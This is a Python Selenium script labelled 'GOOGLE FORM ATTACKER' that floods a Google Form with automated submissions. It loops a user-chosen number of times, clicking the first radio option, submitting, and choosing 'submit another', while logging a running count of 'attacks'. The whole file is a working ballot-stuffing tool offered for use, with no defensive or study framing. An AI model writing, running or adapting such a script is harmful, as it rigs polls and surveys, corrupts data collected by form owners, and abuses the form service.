from selenium import webdriver

from selenium.webdriver.support import expected_conditions as EC
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait

import time

# open log.txt and get total
f = open('log.txt')
total = int(f.readlines()[0])
f.close()
print("Loaded previous attacks. ")

# set number of attacks
attacks = input("\n\n  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ \n\n GOOGLE FORM ATTACKER \n \n Input the number of submissions you would like to attempt: ")
base = input("Input the base URL: ")
initial = base + '/viewform'
after = base + '/formResponse'

# Open the driver and webpage
browser = webdriver.Safari()
browser.get(initial)
wait = WebDriverWait(browser, 10)


# Display that attacks have started and which have happened
print(f"\n \n Attacks have started. \n \n")

# run attacks
for i in range(int(attacks)):
    # Click the right selection
    browser.find_elements_by_class_name('quantumWizTogglePaperradioOffRadio')[0].click()

    # Click the submit
    browser.find_element_by_class_name('quantumWizButtonPaperbuttonFlat').click()

    # wait for redirect
    time.sleep(1)
    wait.until(EC.url_to_be(after))

    # Click 'submit another'
    browser.find_elements_by_tag_name('a')[0].click()

    # wait for redirect
    time.sleep(1)
    wait.until(EC.url_to_be(initial))

    # increment total
    total += 1
    print(f'Completed: {total} ({i+1}/{attacks})', end="\r")

    # update log.txt
    with open('log.txt', 'w') as f:
        f.write(str(total))
    f.close()

print('\n\n Attacks have finished successfully!')
